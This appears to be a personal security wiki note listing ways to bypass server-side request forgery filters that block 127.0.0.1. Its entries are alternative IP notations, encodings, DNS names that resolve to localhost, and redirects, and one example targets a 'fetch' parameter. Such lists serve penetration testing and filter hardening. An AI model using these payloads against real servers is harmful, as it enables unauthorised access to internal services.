---
tags:
  - security
---
In cases where the administrator blocks `127.0.0.1`:
Bypassed with:
- Case variation
- [[Percent Encoding|URL Encoding]] or [[Double URL Encoding]]
- `https://127.0.0.1.nip.io`
- `http://[::]`
- `http://[0:0:0:0:0:ffff:127.0.0.1]`
- `http://0000::1`
- `http://2130706433`
- `http://0177.0.0.1`
- `http://127.1`
- `http://127.0.1`
- Domains that resolve to `127.0.0.1` perhaps `https://vuln.com/?fetch=http://vuln.local.gd`
- Your own site that redirects (`300`) to the target site
- `http://localhost.bell.ca`
- `http://localhost.videotron.ca`
- `http://localhost.rogers.com`
- `http://localhost.telus.com`
- `localhost`